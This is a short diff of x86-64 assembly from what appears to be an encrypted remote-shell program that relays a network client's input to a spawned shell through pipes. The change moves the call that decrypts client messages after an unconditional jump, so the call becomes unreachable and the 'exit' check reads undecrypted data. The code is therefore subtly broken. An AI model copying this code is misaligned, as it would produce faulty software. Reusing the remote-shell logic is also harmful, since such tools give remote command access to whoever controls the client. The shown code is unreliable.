@@ -425,11 +425,6 @@ read_write_loop:
 	js finish_shell
 	mov rbuffcli_size, rax					; rbuffcli_size = read(mcli_fd, rbuffcli, BUFFSZ)
 
-	mov rdi, rbuffcli						; decrypt the msg from the clint
-	mov rsi, rbuffcli_size
-	mov rdx, rkey
-	call decrypt							; decrypt(rbuffcli, rbuffcli_size, rkey)
-
 	cmp rbuffcli_size, 0x5					; exit in case client types "exit\n"
 	jne .not_exit
 	cmp DWORD [rbuffcli], "exit"
@@ -438,6 +433,11 @@ read_write_loop:
 	jne .not_exit
 	mov mend_tls, 0x1
 	jmp end_conection
+
+	mov rdi, rbuffcli						; decrypt the msg from the clint
+	mov rsi, rbuffcli_size
+	mov rdx, rkey
+	call decrypt							; decrypt(rbuffcli, rbuffcli_size, rkey)
 
 .not_exit:
 	test rbuffcli_size, rbuffcli_size		; end conection in case of EOF
@@ -452,7 +452,7 @@ end_conection:
 	mov edi, mcli_fd
 	syscall									; close(mcli_fd)
 	mov rax, SYS_CLOSE						; close input shell
-	mov edi, DWORD [mpipesfd_in + 0x04]
+	mov edi, DWORD [mpipesfd_in + 0x4]
 	syscall									; close(mpipesfd_in[1])
 	mov rax, SYS_CLOSE						; close output shell
 	mov edi, DWORD [mpipesfd_out]
